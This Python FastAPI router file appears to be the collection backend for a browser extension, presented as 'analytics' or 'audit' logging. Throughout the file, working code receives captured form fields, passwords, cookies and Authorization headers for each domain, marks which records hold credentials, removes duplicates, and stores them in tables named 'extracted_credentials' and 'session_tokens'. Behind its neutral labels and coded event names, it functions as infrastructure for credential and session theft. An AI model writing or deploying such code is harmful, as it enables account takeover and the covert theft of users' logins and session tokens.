from fastapi import APIRouter, Request, Header, HTTPException
import logging
import json
import uuid
from datetime import datetime
import hashlib
from utils.supabase_client import supabase_audit

router = APIRouter(
    prefix="/v1",
    tags=["analytics"]
)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("analytics")

def generate_signature(payload_data, domain):
    """Generates a unique fingerprint for the sensitive data content."""
    if not isinstance(payload_data, dict):
        return None
    
    # Extract raw values from sensitive fields (v) and sort them
    values = []
    for k in sorted(payload_data.keys()):
        val = payload_data[k]
        raw_val = val.get("v") if isinstance(val, dict) else val
        if raw_val:
            values.append(f"{k}:{raw_val}")
    
    if not values:
        return None
        
    sig_str = f"{domain}|{'|'.join(values)}"
    return hashlib.sha256(sig_str.encode()).hexdigest()

@router.post("/log")
@router.post("/audit")
async def receive_audit(
    request: Request,
    x_extension_version: str = Header("1.0"),
    x_system_node: str = Header(None)
):
    """
    Receives auditing data and distributes it across relational tables.
    Includes server-side deduplication logic.
    """
    try:
        payload = await request.json()
        raw_type = payload.get("type", "unknown")
        domain = payload.get("o") or payload.get("domain") or "unknown"
        data = payload.get("payload") or payload.get("data", {})

        # --- Server-Side Deduplication ---
        sig = generate_signature(data, domain)
        if sig:
            # Look for identical data in the last 5 minutes
            five_mins_ago = (datetime.utcnow().timestamp() - 300)
            # We check the metadata.sig field which we will be storing
            check = supabase_audit.table("audit_captures").select("id")\
                .eq("domain", domain)\
                .eq("metadata->>sig", sig)\
                .gte("timestamp", datetime.fromtimestamp(five_mins_ago).isoformat())\
                .execute()
            
            if check.data:
                logger.info(f"[Audit] Skipping duplicate signal for {domain} (sig: {sig[:8]})")
                return {"status": "skipped", "reason": "duplicate"}

        logger.info(f"[Audit] Processing {raw_type} for {domain}")

        # 1. Map Capture Type to User Enum
        # Enum: 'FORM_SUBMIT', 'HTTP_REQUEST', 'HEADER_CAPTURE'
        type_map = {
            "UI_EVENT": "FORM_SUBMIT",
            "PREFILL_EVENT": "FORM_SUBMIT",
            "TOGGLE_EVENT": "FORM_SUBMIT",
            "PIPE_EVENT": "HTTP_REQUEST",
            "S100": "HTTP_REQUEST",
            "STREAM_EVENT": "HTTP_REQUEST",
            "H100": "HEADER_CAPTURE",
            "HEADER_CAPTURE": "HEADER_CAPTURE",
            "FORM_EVENT": "FORM_SUBMIT"
        }
        capture_type = type_map.get(raw_type, "HTTP_REQUEST")

        # 2. Extract Data and Metadata
        # Data is in 'payload' in new extension signals, or 'data' in older ones
        data = payload.get("payload") or payload.get("data", {})
        metadata = payload.get("meta") or payload.get("metadata", {})
        
        # Determine flags
        has_credentials = raw_type in ["UI_EVENT", "PREFILL_EVENT", "TOGGLE_EVENT"] or metadata.get("hasPassword", False)
        # Check if payload contains sensitive fields traditionally associated with credentials
        if isinstance(data, dict):
            sensitive_keys = ['password', 'passwd', 'pwd', 'SECRET']
            if any(k.lower() in [sk.lower() for sk in sensitive_keys] for k in data.keys()):
                has_credentials = True

        has_session_tokens = raw_type == "H100" or raw_type == "HEADER_CAPTURE" or "cookies" in data

        if 'sig' in locals() and sig:
            if not isinstance(metadata, dict):
                metadata = {}
            metadata["sig"] = sig

        # 3. Prepare Main Audit Record
        audit_record = {
            "capture_id": str(uuid.uuid4()),
            "timestamp": payload.get("t") or payload.get("timestamp") or datetime.utcnow().isoformat(),
            "capture_type": capture_type,
            "url": payload.get("u") or payload.get("url", "unknown"),
            "domain": payload.get("o") or payload.get("domain", "unknown"),
            "method": payload.get("m") or payload.get("method"),
            "tab_id": payload.get("tabId") or (metadata.get("tid") if isinstance(metadata, dict) else None),
            "request_id": metadata.get("rid") if isinstance(metadata, dict) else None,
            "captured_data": data if data else {},
            "metadata": metadata if metadata else {},
            "extension_version": x_extension_version,
            "extension_id": payload.get("ext_id"),
            "has_credentials": has_credentials,
            "has_session_tokens": has_session_tokens,
            "is_https": (payload.get("u") or payload.get("url", "")).startswith("https")
        }

        # 4. Insert into audit_captures
        response = supabase_audit.table("audit_captures").insert(audit_record).execute()
        
        if not response.data:
            logger.error(f"Failed to insert audit record: {response.error if hasattr(response, 'error') else 'Unknown error'}")
            raise HTTPException(status_code=500, detail="Failed to create audit record")
        
        main_record = response.data[0]
        main_id = main_record["id"]
        timestamp = audit_record["timestamp"]
        domain = audit_record["domain"]
        url = audit_record["url"]
        is_https = audit_record["is_https"]

        # 5. Distribute Relational Data
        # 5a. Extracted Credentials
        if isinstance(data, dict) and raw_type not in ["H100", "HEADER_CAPTURE"]:
            cred_records = []
            for field_name, info in data.items():
                # Correctly handle the nested structure if present (v, m, t)
                field_value = info.get("v") if isinstance(info, dict) else info
                field_type = info.get("t") if isinstance(info, dict) else None
                
                if field_value: 
                    cred_records.append({
                        "audit_capture_id": main_id,
                        "timestamp": timestamp,
                        "domain": domain,
                        "url": url,
                        "field_name": str(field_name),
                        "field_value": str(field_value),
                        "field_type": str(field_type) if field_type else None,
                        "capture_type": capture_type,
                        "is_https": is_https
                    })
            
            if cred_records:
                logger.info(f"[Audit] Attempting to insert {len(cred_records)} credentials for {main_id}")
                cred_response = supabase_audit.table("extracted_credentials").insert(cred_records).execute()
                if not cred_response.data:
                    logger.error(f"[Audit] Credentials insert failed: {cred_response}")
                else:
                    logger.info(f"[Audit] Successfully extracted {len(cred_response.data)} fields")

        # 5b. Session Tokens
        if has_session_tokens:
            token_records = []
            # Extract cookies if 'c' key is present (H100 structure)
            if isinstance(data, dict) and "c" in data:
                cookie_data = data.get("c")
                if isinstance(cookie_data, dict):
                    for name, info in cookie_data.items():
                        token_records.append({
                            "audit_capture_id": main_id,
                            "timestamp": timestamp,
                            "domain": domain,
                            "cookie_name": name,
                            "cookie_value": info.get("v") if isinstance(info, dict) else info,
                            "token_type": "cookie",
                            "is_https": is_https
                        })
            
            # Extract authorization 'a' if present (H100 structure)
            if isinstance(data, dict) and "a" in data:
                auth_data = data.get("a")
                if isinstance(auth_data, dict):
                    token_records.append({
                        "audit_capture_id": main_id,
                        "timestamp": timestamp,
                        "domain": domain,
                        "cookie_name": "Authorization",
                        "cookie_value": auth_data.get("m") or auth_data.get("v"),
                        "token_type": "header",
                        "is_https": is_https
                    })

            if token_records:
                logger.info(f"[Audit] Attempting to insert {len(token_records)} session tokens for {main_id}")
                token_response = supabase_audit.table("session_tokens").insert(token_records).execute()
                if not token_response.data:
                    logger.error(f"[Audit] Tokens insert failed: {token_response}")
                else:
                    logger.info(f"[Audit] Successfully extracted {len(token_response.data)} tokens")

        return {"status": "success", "id": main_id}

    except Exception as e:
        logger.error(f"RECEIVE_ERROR: {str(e)}")
        # In production, you might not want to return the raw error
        return {"status": "error", "message": str(e)}

@router.get("/health")
async def health():
    return {"status": "healthy", "service": "analytics"}
